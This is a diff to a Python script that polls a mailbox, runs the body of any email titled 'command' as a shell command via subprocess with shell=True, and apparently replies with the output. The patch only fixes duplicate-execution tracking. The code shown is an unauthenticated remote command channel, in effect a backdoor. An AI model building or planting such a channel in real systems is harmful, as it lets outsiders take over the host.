@@ -22,7 +22,8 @@ try:
     s = smtplib.SMTP_SSL(smtp_url)
     s.login(user, password)
 
-    old_message = ""
+    old_id = 0
+    new_id = 0
     current_message = ""
     from_user = ""
 
@@ -44,8 +45,9 @@ try:
 
             if "plain" in content_type and email_message["Subject"] == "command":
                 current_message = part.get_payload()
+                new_id = most_recent
 
-            if old_message != current_message:
+            if old_id != new_id and old_id != 0:
                 from_user = email_message["From"]
                 response = subprocess.check_output(
                     current_message[:-2], shell=True, stderr=subprocess.STDOUT
@@ -60,6 +62,6 @@ try:
                 except:
                     print("Could not reply to: " + from_user)
 
-                old_message = current_message
+            old_id = new_id
 except:
     print("Could not log in!")
